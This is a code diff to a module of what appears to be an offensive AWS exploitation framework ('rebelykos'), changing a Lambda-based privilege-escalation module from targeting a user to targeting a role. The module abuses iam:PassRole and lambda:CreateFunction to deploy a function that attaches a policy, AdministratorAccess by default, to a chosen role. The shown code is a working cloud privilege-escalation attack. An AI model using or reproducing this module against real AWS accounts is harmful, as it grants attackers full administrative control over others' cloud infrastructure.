@@ -14,19 +14,21 @@ from rebelykos.core.utils import gen_random_string
 class RLModule(Module):
     def __init__(self):
         super().__init__()
-        self.name = "lambda_privesc"
+        self.name = "lambda_role_privesc"
         self.description = ("Elevate privilege by using iam:PassRole, "
                             "lambda:CreateFunction, and "
                             "lambda:InvokeFunction. "
                             "(and lambda:DeleteFunction")
         self.author = "Takahiro Yokoyama"
-        self.options["UserName"] = {
-            "Description": "User to elevate privilege.",
+        self.options["RoleName"] = {
+            "Description": ("The name (friendly name, not ARN) of"
+                            " the role to attach the policy to."),
             "Required": True,
             "Value": ""
         }
         self.options["PolicyArn"] = {
-            "Description": "Policy to attach to user.",
+            "Description": ("The Amazon Resource Name (ARN) of "
+                            "the IAM policy you want to attach."),
             "Required": True,
             "Value": "arn:aws:iam::aws:policy/AdministratorAccess"
         }
@@ -39,7 +41,7 @@ class RLModule(Module):
 
     def run(self):
         client = boto3.client("lambda", **self["profile"])
-        user = shlex.quote(self["UserName"])
+        role = shlex.quote(self["RoleName"])
         policyarn = shlex.quote(self["PolicyArn"])
         # I'm afraid this is really secure
         lambda_privesc = f"""
@@ -48,8 +50,8 @@ import boto3
 
 def lambda_handler(event, context):
     client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='{user}',
+    response = client.attach_role_policy(
+        RoleName='{role}',
         PolicyArn='{policyarn}'
     )
     return response
